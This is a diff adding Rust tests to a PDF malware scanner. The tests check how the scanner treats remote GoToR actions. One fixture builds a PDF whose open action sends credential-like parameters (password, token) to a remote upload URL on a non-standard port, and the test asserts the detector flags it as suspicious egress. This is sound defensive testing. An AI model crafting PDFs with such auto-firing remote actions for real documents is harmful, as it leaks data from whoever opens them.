@@ -191,6 +191,67 @@ fn benign_gotor_relative_target_does_not_trigger_suspicious_remote_target() {
 }
 
 #[test]
+fn benign_gotor_https_target_does_not_trigger_suspicious_remote_target() {
+    let objects = vec![
+        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
+        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
+        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
+        "4 0 obj\n<< /S /GoToR /F (https://example.com/docs/reference.pdf) >>\nendobj\n",
+    ];
+    let bytes = build_pdf_with_objects(&objects);
+    let detectors = sis_pdf_detectors::default_detectors();
+    let report =
+        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
+            .expect("scan");
+
+    assert!(
+        !report.findings.iter().any(|f| f.kind == "action_remote_target_suspicious"),
+        "benign https target should not trigger suspicious remote target finding"
+    );
+}
+
+#[test]
+fn gotor_exfil_style_https_target_is_flagged_with_risk_class() {
+    let objects = vec![
+        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
+        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
+        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
+        "4 0 obj\n<< /S /GoToR /F (https://user@example.com:8080/upload.php?password=abc123&token=zx) >>\nendobj\n",
+    ];
+    let bytes = build_pdf_with_objects(&objects);
+    let detectors = sis_pdf_detectors::default_detectors();
+    let report =
+        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
+            .expect("scan");
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "action_remote_target_suspicious")
+        .expect("suspicious remote target finding");
+    assert!(matches!(
+        finding.severity,
+        sis_pdf_core::model::Severity::Medium | sis_pdf_core::model::Severity::High
+    ));
+    assert!(matches!(
+        finding.meta.get("egress.risk_class").map(String::as_str),
+        Some("medium" | "high")
+    ));
+    assert_eq!(finding.meta.get("egress.channel").map(String::as_str), Some("remote_goto"));
+    assert!(
+        finding
+            .meta
+            .get("action.remote.indicators")
+            .map(|value| {
+                value.contains("uri_exfil_pattern")
+                    || value.contains("uri_userinfo")
+                    || value.contains("uri_non_standard_port")
+            })
+            .unwrap_or(false),
+        "expected URI exfil/userinfo/port indicators"
+    );
+}
+
+#[test]
 fn submitform_action_includes_egress_metadata() {
     let objects = vec![
         "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
